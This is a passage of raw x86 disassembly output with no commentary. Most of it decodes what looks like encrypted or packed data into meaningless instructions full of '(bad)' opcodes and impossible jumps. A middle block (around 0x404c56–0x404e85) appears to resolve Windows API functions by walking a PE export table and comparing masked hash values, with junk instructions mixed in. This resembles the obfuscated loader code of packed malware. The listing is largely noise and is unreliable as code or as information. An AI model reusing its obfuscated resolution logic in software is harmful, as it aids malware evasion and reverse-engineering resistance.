  404771:	cmp    eax,0xa0e3d7b9
  404776:	pop    es
  404777:	inc    esp
  404778:	lahf   
  404779:	call   0x7a2a1662
  40477e:	push   cs
  40477f:	aad    0xee
  404781:	ror    BYTE PTR [edx+0x1a],1
  404784:	push   ebx
  404785:	dec    edx
  404786:	aam    0x9c
  404788:	cmc    
  404789:	cwde   
  40478a:	in     al,0x3f
  40478c:	dec    ecx
  40478d:	imul   esp,DWORD PTR [edi+0x60],0x1b
  404791:	arpl   WORD PTR [ecx-0x2a],bp
  404794:	outs   dx,DWORD PTR ds:[esi]
  404795:	xor    edi,esp
  404797:	sbb    bl,BYTE PTR [esi-0x76]
  40479a:	scas   al,BYTE PTR es:[edi]
  40479b:	pop    edx
  40479c:	popa   
  40479d:	adc    eax,0xa573fcfd
  4047a2:	int3   
  4047a3:	dec    esi
  4047a4:	push   esi
  4047a5:	cmp    al,0x17
  4047a7:	add    BYTE PTR [edi-0x2f],ch
  4047aa:	and    BYTE PTR [eax-0x61830f7a],cl
  4047b0:	jo     0x4047fa
  4047b2:	sbb    ax,0x3b53
  4047b6:	fst    QWORD PTR [eax]
  4047b8:	jnp    0x404837
  4047ba:	imul   ecx,edi,0x7a171169
  4047c0:	and    al,0x99
  4047c2:	mov    ecx,0x5a10118a
  4047c7:	cmp    BYTE PTR [eax+eax*1-0xd9a4993],0xaf
  4047cf:	es push ecx
  4047d1:	in     eax,0x73
  4047d3:	mov    eax,0xefcd5362
  4047d8:	cdq    
  4047d9:	outs   dx,DWORD PTR ds:[esi]
  4047da:	inc    eax
  4047db:	es mov ebx,0x2b2a8e4b
  4047e1:	xor    eax,0xc4f60d31
  4047e6:	add    esp,DWORD PTR [esi-0x7c]
  4047e9:	jg     0x40476c
  4047eb:	ss daa 
  4047ed:	mov    ds:0x3e69ef2a,eax
  4047f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047f3:	push   esi
  4047f4:	mov    esp,0xee1d7226
  4047f9:	mov    eax,0x46691758
  4047fe:	fstp   QWORD PTR [edx+0x5d]
  404801:	pop    esi
  404802:	(bad)  
  404803:	shl    BYTE PTR [edx+ecx*4-0x7622bdc1],1
  40480a:	dec    ebp
  40480b:	xchg   ecx,eax
  40480c:	adc    BYTE PTR ss:[ecx-0x27d7cda3],bl
  404813:	adc    ebx,DWORD PTR [ebx+0x69]
  404816:	stc    
  404817:	into   
  404818:	repz sbb al,0x12
  40481b:	pop    es
  40481c:	pop    ebx
  40481d:	fisttp DWORD PTR [ecx]
  40481f:	dec    eax
  404820:	lods   eax,DWORD PTR ds:[esi]
  404821:	out    0x2,eax
  404823:	pop    edx
  404824:	and    esi,DWORD PTR [edi+0x68]
  404827:	pop    esi
  404828:	jne    0x404833
  40482a:	or     BYTE PTR [eax+eax*8],0xeb
  40482e:	enter  0x1bea,0x78
  404832:	jo     0x404832
  404834:	cli    
  404835:	(bad)
  404839:	xchg   al,ch
  40483b:	fs sub eax,0x1ab91a4f
  404841:	xlat   BYTE PTR ds:[ebx]
  404842:	mov    ch,0x49
  404844:	sbb    BYTE PTR [eax+edi*4-0x1e680969],al
  40484b:	mov    esi,0xe8dd3873
  404850:	mov    esi,0x6b5c8703
  404855:	jecxz  0x404805
  404857:	scas   eax,DWORD PTR es:[edi]
  404858:	push   ebx
  404859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40485a:	pushf  
  40485b:	rcr    DWORD PTR [edi],1
  40485d:	pop    ebp
  40485e:	jne    0x4048bf
  404860:	jno    0x4048d4
  404862:	sub    eax,0x63c9a5ec
  404867:	out    dx,al
  404868:	lods   al,BYTE PTR ds:[esi]
  404869:	loop   0x4047fb
  40486b:	mov    BYTE PTR [edi],al
  40486d:	push   esi
  40486e:	jmp    0xddc3:0x149708f2
  404875:	pop    ss
  404876:	add    al,0x86
  404878:	bound  ebp,QWORD PTR gs:[edx-0x5ccab71a]
  40487f:	mov    al,ds:0x2dd93678
  404884:	iret   
  404885:	adc    al,0xb
  404887:	enter  0xb591,0x29
  40488b:	sub    eax,edi
  40488d:	cdq    
  40488e:	(bad)  
  40488f:	das    
  404890:	scas   eax,DWORD PTR es:[edi]
  404891:	fadd   st,st(7)
  404893:	dec    eax
  404894:	xor    BYTE PTR [esi+0x6d],0x3b
  404898:	cmp    eax,0x807178fc
  40489d:	pop    edx
  40489e:	mov    eax,0xe49d3d32
  4048a3:	xor    BYTE PTR [ecx-0x18],ah
  4048a6:	in     eax,0x2d
  4048a8:	daa    
  4048a9:	sbb    eax,DWORD PTR [ecx]
  4048ab:	rol    DWORD PTR [eax+0x23d2d1d9],cl
  4048b1:	sbb    al,0x56
  4048b3:	or     al,0xc9
  4048b5:	pandn  mm5,QWORD PTR ds:0xe9149788
  4048bc:	mov    bh,0x60
  4048be:	lds    eax,FWORD PTR [ecx]
  4048c0:	cs jle 0x4048c5
  4048c3:	test   BYTE PTR [esi+0x72],dl
  4048c6:	pop    edx
  4048c7:	mov    ebp,0x644fabe6
  4048cc:	pop    eax
  4048cd:	xor    al,0xf9
  4048cf:	jns    0x4048df
  4048d1:	rcl    BYTE PTR [ecx-0x7c68ec79],cl
  4048d7:	mov    dl,0x7f
  4048d9:	rcr    esp,cl
  4048db:	mov    eax,0x4ce99f1e
  4048e0:	sub    BYTE PTR [edx],ch
  4048e2:	shl    BYTE PTR [esi],cl
  4048e4:	cmp    esi,DWORD PTR [ecx-0x5a]
  4048e7:	xchg   esp,eax
  4048e8:	push   ss
  4048e9:	mov    esi,0xc9cd590d
  4048ee:	addr16 enter 0x4223,0x49
  4048f3:	mov    esp,0x5002fd63
  4048f8:	xor    bh,BYTE PTR [ebx-0x73056a4c]
  4048fe:	jo     0x4048a6
  404900:	push   ebp
  404901:	repnz push 0x69
  404904:	dec    ecx
  404905:	jp     0x4048e3
  404907:	push   ds
  404908:	retf   
  404909:	std    
  40490a:	pop    edx
  40490b:	ins    DWORD PTR es:[edi],dx
  40490c:	(bad)  
  40490d:	mov    eax,ds:0x5c443bee
  404912:	mov    esp,0xf5a72cd1
  404917:	add    eax,0xf9356439
  40491c:	mov    WORD PTR [edi+0x141946d3],ss
  404922:	inc    ecx
  404923:	rcr    BYTE PTR [edx],cl
  404925:	xor    DWORD PTR [ebp-0x7f],ecx
  404928:	mov    eax,0x347c839
  40492d:	aad    0xf1
  40492f:	mov    ds:0xbdb97eaa,al
  404934:	leave  
  404935:	mov    dl,0xda
  404937:	retf   0x9fe4
  40493a:	or     al,0x61
  40493c:	and    al,0x8a
  40493e:	test   DWORD PTR [eax-0x53ad7309],ecx
  404944:	mov    esp,0xe96a55b6
  404949:	je     0x4048d9
  40494b:	cld    
  40494c:	sub    esi,ebp
  40494e:	aam    0xda
  404950:	clc    
  404951:	repnz ds inc edi
  404954:	lahf   
  404955:	mov    al,0x92
  404957:	sbb    al,0x2d
  404959:	mov    ch,0xa6
  40495b:	xchg   edx,eax
  40495c:	mov    eax,edx
  40495e:	js     0x4049b0
  404960:	out    0x7e,eax
  404962:	cmp    ah,BYTE PTR [ebx-0x35d1f00a]
  404968:	xlat   BYTE PTR ds:[ebx]
  404969:	jb     0x4048ef
  40496b:	cmc    
  40496c:	(bad)  
  40496d:	mov    esp,0xea8b93f
  404972:	pop    esp
  404973:	jmp    FWORD PTR [ebx+0x2d80d16e]
  404979:	mov    ?,WORD PTR [esi]
  40497b:	retf   0x68ee
  40497e:	imul   ebp,DWORD PTR [eax+0x48],0xfffffffc
  404982:	cwde   
  404983:	hlt    
  404984:	dec    ebx
  404985:	xchg   ecx,eax
  404986:	and    DWORD PTR [eax],0xffffff92
  404989:	ins    BYTE PTR es:[edi],dx
  40498a:	sbb    DWORD PTR [esi+edx*1+0x3e930152],esp
  404991:	outs   dx,BYTE PTR ds:[esi]
  404992:	push   0x6
  404994:	in     eax,dx
  404995:	mov    esi,0xab75820d
  40499a:	pop    eax
  40499b:	inc    eax
  40499c:	hlt    
  40499d:	mov    ah,0xef
  40499f:	push   edi
  4049a0:	cmp    ecx,DWORD PTR [esi]
  4049a2:	cli    
  4049a3:	push   ss
  4049a4:	outs   dx,DWORD PTR ds:[esi]
  4049a5:	sahf   
  4049a6:	add    eax,0xa021a1cd
  4049ab:	add    edx,0x76aa47b3
  4049b1:	inc    edi
  4049b2:	std    
  4049b3:	mov    ds:0x2cadf281,al
  4049b8:	(bad)  
  4049b9:	pop    esp
  4049ba:	or     ebp,eax
  4049bc:	test   BYTE PTR [ebp-0x72],bh
  4049bf:	mov    ebp,0x826e450d
  4049c4:	in     eax,dx
  4049c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049c6:	cmp    ecx,esi
  4049c8:	popa   
  4049c9:	xor    al,bh
  4049cb:	fmul   QWORD PTR [edi]
  4049cd:	sub    al,0x10
  4049cf:	and    dh,BYTE PTR [esi+0x5]
  4049d2:	js     0x404955
  4049d4:	in     eax,0xc1
  4049d6:	xlat   BYTE PTR ds:[ebx]
  4049d7:	arpl   WORD PTR [ecx],bx
  4049d9:	xor    eax,0xcb072602
  4049de:	push   cs
  4049df:	idiv   bh
  4049e1:	xchg   BYTE PTR [edx+edx*2+0x35a84ac2],cl
  4049e8:	mov    ebx,0x75a4b286
  4049ed:	cmp    eax,0x20edc879
  4049f2:	dec    ecx
  4049f3:	lock and ebx,DWORD PTR [ebx]
  4049f6:	imul   esp,DWORD PTR [ebp+eiz*1-0x3b],0x66
  4049fb:	pop    ebx
  4049fc:	ret    
  4049fd:	dec    esi
  4049fe:	push   esi
  4049ff:	pop    esi
  404a00:	jl     0x404a1e
  404a02:	sub    al,0xed
  404a04:	mov    edi,ds
  404a06:	push   eax
  404a07:	bound  edx,QWORD PTR ds:0xdabbb1ec
  404a0d:	aam    0x90
  404a0f:	or     DWORD PTR [edx-0x2491ef05],0xffffffca
  404a16:	jne    0x404a20
  404a18:	shl    BYTE PTR [esp+ebp*1-0x4c5de557],cl
  404a1f:	repz cli 
  404a21:	push   esp
  404a22:	mov    edi,ecx
  404a24:	mov    cl,0xf7
  404a26:	int    0x21
  404a28:	mov    ebx,0xb0065942
  404a2d:	mov    bh,0xfe
  404a2f:	xor    DWORD PTR [esi+edx*2-0x39],ebp
  404a33:	shr    bh,1
  404a35:	fcomp  QWORD PTR fs:[eax]
  404a38:	cmp    bl,BYTE PTR [ebp-0x4d636cc]
  404a3e:	inc    ebx
  404a3f:	push   ss
  404a40:	(bad)  
  404a41:	mov    ch,bl
  404a43:	test   eax,0xf6e10f17
  404a48:	gs or  dh,bl
  404a4b:	into   
  404a4c:	add    esp,DWORD PTR [esi+0x7a79a06d]
  404a52:	aaa    
  404a53:	jle    0x404a4e
  404a55:	pop    ecx
  404a56:	lock fidivr WORD PTR [ebx-0x1d5a56d3]
  404a5d:	stc    
  404a5e:	nop
  404a5f:	aas    
  404a60:	pop    esp
  404a61:	jo     0x404ab4
  404a63:	sbb    al,0x2d
  404a65:	jecxz  0x4049f7
  404a67:	mov    esi,0xd386c99c
  404a6c:	or     cl,BYTE PTR [eax]
  404a6e:	js     0x404a3d
  404a70:	std    
  404a71:	sbb    esi,DWORD PTR [ecx]
  404a73:	adc    edx,eax
  404a75:	sbb    al,0x60
  404a77:	sub    DWORD PTR [eax],ecx
  404a79:	aas    
  404a7a:	enter  0x2667,0x8b
  404a7e:	inc    edx
  404a7f:	and    DWORD PTR [edi],0x258dcc76
  404a85:	add    al,0x2
  404a87:	cmp    al,0xcb
  404a89:	jecxz  0x404a86
  404a8b:	xor    ebp,esi
  404a8d:	iret   
  404a8e:	sbb    BYTE PTR [edi+0x16],bl
  404a91:	sub    BYTE PTR ds:0xcbb31593,ah
  404a97:	sub    DWORD PTR [eax+edx*8-0x1d848a85],ecx
  404a9e:	pop    ds
  404a9f:	mov    ecx,0x1e6cef0a
  404aa4:	adc    ah,BYTE PTR ds:0x60510386
  404aaa:	(bad)  
  404aab:	xchg   ebp,eax
  404aac:	in     al,dx
  404aad:	mov    edi,0x5e6967fd
  404ab2:	or     DWORD PTR [ecx],edi
  404ab4:	int    0x7c
  404ab6:	aad    0xa
  404ab8:	scas   eax,DWORD PTR es:[edi]
  404ab9:	xchg   esp,eax
  404aba:	push   ecx
  404abb:	inc    eax
  404abc:	mov    dl,0x2f
  404abe:	cdq    
  404abf:	in     al,dx
  404ac0:	scas   eax,DWORD PTR es:[edi]
  404ac1:	sbb    dl,BYTE PTR [ecx-0x3b15fe1d]
  404ac7:	iret   
  404ac8:	fbld   TBYTE PTR [eax-0x2ed7e34b]
  404ace:	mov    BYTE PTR [eax-0x10],al
  404ad1:	(bad)  
  404ad2:	movntps XMMWORD PTR [ebp-0x5c],xmm2
  404ad6:	lahf   
  404ad7:	push   0x30177821
  404adc:	mov    ch,0xb5
  404ade:	mov    ebp,0x2080f29
  404ae3:	or     dl,BYTE PTR [ebx-0x59b6b6e7]
  404ae9:	aad    0x57
  404aeb:	sahf   
  404aec:	scas   eax,DWORD PTR es:[edi]
  404aed:	jo     0x404b54
  404aef:	jl     0x404b2c
  404af1:	pop    ecx
  404af2:	mov    eax,ds:0xb17bab6
  404af7:	mov    ebx,0xeef91dcf
  404afc:	jno    0x404af4
  404afe:	inc    esi
  404aff:	in     al,0x5a
  404b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b02:	clc    
  404b03:	pop    ds
  404b04:	shl    BYTE PTR [eax+0x385c6923],1
  404b0a:	inc    edx
  404b0b:	xchg   esi,eax
  404b0c:	arpl   WORD PTR [edi-0x5c96de84],bx
  404b12:	mov    eax,0xc2d5331d
  404b17:	sar    BYTE PTR [ebp+0x7273cc2],cl
  404b1d:	imul   esi,DWORD PTR [edi],0x36
  404b20:	outs   dx,BYTE PTR ds:[esi]
  404b21:	jl     0x404b8b
  404b23:	mov    ah,0xed
  404b25:	pop    ebp
  404b26:	ins    BYTE PTR es:[edi],dx
  404b27:	aaa    
  404b28:	add    ebx,esi
  404b2a:	in     eax,dx
  404b2b:	jecxz  0x404b2e
  404b2d:	icebp  
  404b2e:	jp     0x404b41
  404b30:	jne    0x404af8
  404b32:	(bad)  
  404b33:	cmp    eax,0x15f1fcb3
  404b38:	xor    DWORD PTR [edi],esi
  404b3a:	fs pop edx
  404b3c:	and    BYTE PTR [edi],0xa4
  404b3f:	mov    esp,0x412e712d
  404b44:	pop    ss
  404b45:	xor    al,0x1a
  404b48:	outs   dx,BYTE PTR ds:[esi]
  404b49:	jl     0x404ad7
  404b4b:	add    edx,0x20
  404b4e:	adc    esp,edx
  404b50:	pop    ebp
  404b51:	nop
  404b52:	xor    DWORD PTR [edx+0x422250bb],ecx
  404b58:	push   esp
  404b59:	sub    DWORD PTR [eax],ecx
  404b5b:	pop    ds
  404b5c:	push   ss
  404b5d:	rol    DWORD PTR [edx+0xe99f735],0xb0
  404b64:	sub    DWORD PTR [ebx],edi
  404b66:	jmp    0x30ca:0x2ffc1dc4
  404b6d:	mov    al,0x5b
  404b6f:	out    dx,al
  404b70:	mov    esi,0xe53f707f
  404b75:	(bad)  
  404b76:	mov    ds:0x3dfc3391,eax
  404b7b:	inc    ebx
  404b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b7d:	pop    ss
  404b7e:	les    ebp,FWORD PTR [edx+0x45]
  404b81:	pusha  
  404b82:	inc    esp
  404b83:	test   DWORD PTR [edx],eax
  404b85:	pop    ebp
  404b86:	js     0x404b83
  404b88:	sub    dh,BYTE PTR [edi-0x5d]
  404b8b:	mov    cl,0x19
  404b8d:	popf   
  404b8e:	fwait
  404b8f:	std    
  404b90:	mov    ds:0xa11f284d,al
  404b95:	inc    ecx
  404b96:	or     BYTE PTR [eax-0x4e],cl
  404b99:	iret   
  404b9a:	inc    edx
  404b9b:	sub    al,0x50
  404b9d:	loopne 0x404b95
  404b9f:	push   esp
  404ba0:	mov    ebp,0xb41b9c4
  404ba5:	in     al,dx
  404ba6:	ins    BYTE PTR es:[edi],dx
  404ba7:	or     ebp,DWORD PTR [esi+0x4c]
  404baa:	lahf   
  404bab:	sahf   
  404bac:	pop    edx
  404bad:	xchg   DWORD PTR [esi-0x2c30ea73],edi
  404bb3:	adc    eax,0x1d0709da
  404bb8:	adc    BYTE PTR [edi-0xe],ch
  404bbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bbc:	mov    ecx,0x4ccb6dd0
  404bc1:	lahf   
  404bc2:	stos   DWORD PTR es:[edi],eax
  404bc3:	std    
  404bc4:	mov    eax,esp
  404bc6:	stos   DWORD PTR es:[edi],eax
  404bc7:	jns    0x404c2f
  404bc9:	js     0x404b87
  404bcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bcc:	add    DWORD PTR ds:0xe42cee58,ebx
  404bd2:	imul   ebx,DWORD PTR ds:0x4ca6bae4,0x45
  404bd9:	and    al,0x93
  404bdb:	outs   dx,DWORD PTR ds:[esi]
  404bdc:	arpl   bp,di
  404bde:	imul   ebx,esi,0xffffffa6
  404be1:	aaa    
  404be2:	(bad)  
  404be3:	mov    bh,BYTE PTR [eax]
  404be5:	test   BYTE PTR [esi],bh
  404be7:	pop    esi
  404be8:	lds    eax,FWORD PTR [edi-0x78]
  404beb:	inc    ecx
  404bec:	add    al,0x96
  404bee:	rol    esi,0xf0
  404bf1:	mov    al,0x7
  404bf3:	or     ch,bh
  404bf5:	rol    DWORD PTR [edi+0x836e29d],0x74
  404bfc:	pop    es
  404bfd:	sub    dl,BYTE PTR ss:[esi]
  404c00:	inc    edi
  404c01:	xchg   ecx,eax
  404c02:	hlt    
  404c03:	dec    esp
  404c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c05:	cmp    eax,0x31f6dcc3
  404c0a:	and    eax,0x62f32a47
  404c0f:	gs add eax,0xa5ed7ff
  404c15:	push   0xc21fb778
  404c1a:	push   edx
  404c1b:	mov    edx,0xf5af088c
  404c20:	cmp    al,0xdb
  404c22:	inc    ebp
  404c23:	add    BYTE PTR [ecx-0x79],ch
  404c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c27:	mov    ah,0x12
  404c29:	int    0x9d
  404c2b:	mov    eax,0xc180253
  404c30:	inc    ecx
  404c31:	outs   dx,BYTE PTR ds:[esi]
  404c32:	jmp    FWORD PTR [ebp+edi*2-0x134173e]
  404c39:	sysret 
  404c3b:	ret    0x1e68
  404c3e:	das    
  404c3f:	jmp    0x7bfa:0xdcd73bf5
  404c46:	jmp    0xfcb7:0xaac62dd3
  404c4d:	push   0x1
  404c4f:	test   al,0xd7
  404c51:	or     eax,0x7e5a4638
  404c56:	mov    eax,DWORD PTR [ebp-0x4]
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	fsubr  DWORD PTR [ebx+0x1b]
  404e99:	push   esi
  404e9a:	or     bl,BYTE PTR [edi+0x7a]
  404e9d:	jp     0x404ea9
  404e9f:	pop    edi
  404ea0:	jp     0x404f1c
  404ea2:	pushf  
  404ea3:	or     esi,DWORD PTR [edi]
  404ea5:	pop    esi
  404ea6:	jb     0x404f22
  404ea8:	cs sti 
  404eaa:	cmp    ch,BYTE PTR [esi+0x63e13590]
  404eb0:	or     dl,BYTE PTR [ebx-0x7db9f13]
  404eb6:	js     0x404f37
  404eb8:	or     al,BYTE PTR [ebp-0x4dc13f8f]
  404ebe:	mov    esi,0x76b40558
  404ec3:	loop   0x404ed8
  404ec5:	int3   
  404ec6:	mov    eax,ds:0xbb5f2987
  404ecb:	mov    dl,0x4
  404ecd:	aaa    
  404ece:	stos   BYTE PTR es:[edi],al
  404ecf:	pop    esp
  404ed0:	xlat   BYTE PTR ds:[ebx]
  404ed1:	cmp    edi,ebp
  404ed3:	jmp    0x6b80dfde
  404ed8:	pop    eax
  404ed9:	ret    0xd85e
  404edc:	xchg   ebx,eax
  404edd:	jbe    0x404f46
  404edf:	pop    ebp
  404ee0:	in     eax,dx
  404ee1:	adc    BYTE PTR [esi+edx*8-0x129d5c6c],ah
  404ee8:	xor    eax,DWORD PTR [esi-0x4]
  404eeb:	ins    DWORD PTR es:[edi],dx
  404eec:	push   cs
  404eed:	jg     0x404f6b
  404eef:	xchg   ecx,eax
  404ef0:	cwde   
  404ef1:	push   ebx
  404ef2:	sub    eax,0x28d9cdc3
  404ef7:	outs   dx,BYTE PTR ds:[esi]
  404ef8:	or     al,BYTE PTR [edi+0x6b613ef7]
  404efe:	sbb    al,0x6a
  404f00:	push   esi
  404f01:	xchg   ecx,eax
  404f02:	sar    DWORD PTR [ecx+0x1367914c],0x35
  404f09:	mov    cl,0xa1
  404f0b:	sbb    eax,DWORD PTR [edi+0x52]
  404f0e:	jns    0x404f4e
  404f10:	inc    esi
  404f12:	and    ebx,DWORD PTR [eax+ecx*8+0x73]
  404f16:	pop    ebx
  404f17:	das    
  404f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f19:	dec    esi
  404f1a:	retf   0x1c0a
  404f1d:	gs add al,0xc7
  404f20:	out    0xe6,al
  404f22:	int3   
  404f23:	push   ebx
  404f24:	aas    
  404f25:	scas   al,BYTE PTR es:[edi]
  404f26:	mov    ds:0xc177f8ac,al
  404f2b:	dec    ecx
  404f2c:	ins    BYTE PTR es:[edi],dx
  404f2d:	cdq    
  404f2e:	xchg   ecx,eax
  404f2f:	fisub  DWORD PTR ds:0xe0a5b2a5
  404f35:	fdivrp st(1),st
  404f37:	fisttp DWORD PTR [edi]
  404f39:	push   esp
  404f3a:	out    dx,eax
  404f3b:	into   
  404f3c:	sub    eax,0xa3b3ab51
  404f41:	retf   0x5a0f
  404f44:	adc    eax,0xccaa36a1
  404f49:	adc    DWORD PTR [edi+esi*4-0x15],edi
  404f4d:	push   es
  404f4e:	lods   eax,DWORD PTR ds:[esi]
  404f4f:	cmp    esi,DWORD PTR [eax-0x10]
  404f52:	or     eax,0xe4c157cc
  404f57:	lods   al,BYTE PTR ds:[esi]
  404f58:	pop    ss
  404f59:	aad    0x85
  404f5b:	ficomp DWORD PTR [edi-0x29863b80]
  404f61:	loope  0x404f46
  404f63:	sbb    edi,DWORD PTR [ebx-0x14]
  404f66:	cmc    
  404f67:	cmc    
  404f68:	call   0x4084398d
  404f6d:	daa    
  404f6e:	sahf   
  404f6f:	mov    cl,0x24
  404f71:	jg     0x404fee
  404f73:	add    ebp,DWORD PTR [ebx+0xf]
  404f76:	lods   eax,DWORD PTR ds:[esi]
  404f77:	sub    BYTE PTR [edi],ah
  404f79:	xchg   ebp,eax
  404f7a:	test   DWORD PTR [edi-0x2],ecx
  404f7d:	in     al,dx
  404f7e:	imul   esi,DWORD PTR [ebp+0x7e],0x23
  404f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f83:	mov    al,0x5c
  404f85:	push   ss
  404f86:	ds int 0xb2
  404f89:	test   BYTE PTR [ebp+0x61],bl
  404f8c:	std    
  404f8d:	imul   ebx,DWORD PTR [edi+0x73],0xffffffe9
